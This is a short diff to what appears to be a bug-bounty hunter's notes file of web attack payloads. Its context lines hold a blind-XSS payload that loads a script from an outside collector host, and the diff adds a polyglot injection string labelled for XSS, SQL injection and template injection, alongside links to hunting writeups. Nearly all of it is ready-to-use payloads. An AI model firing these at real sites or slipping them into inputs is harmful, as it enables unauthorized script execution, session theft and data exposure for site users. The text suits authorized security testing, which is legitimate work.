@@ -11,6 +11,11 @@ BXSS:
 '"><script src=https://xss0r.com/c/lostsec></script>
 
 
+Payload for XSS + SQLi + SSTI/CSTI :
+------------------------------------
+'"><svg/onload=prompt(5);>{{7*7}}
+
+
 ## https://freedium.cfd/https://infosecwriteups.com/from-zero-to-hero-hunting-high-paying-open-redirect-bugs-in-web-apps-fdb80286236e
 
 https://xss.js.org/#/
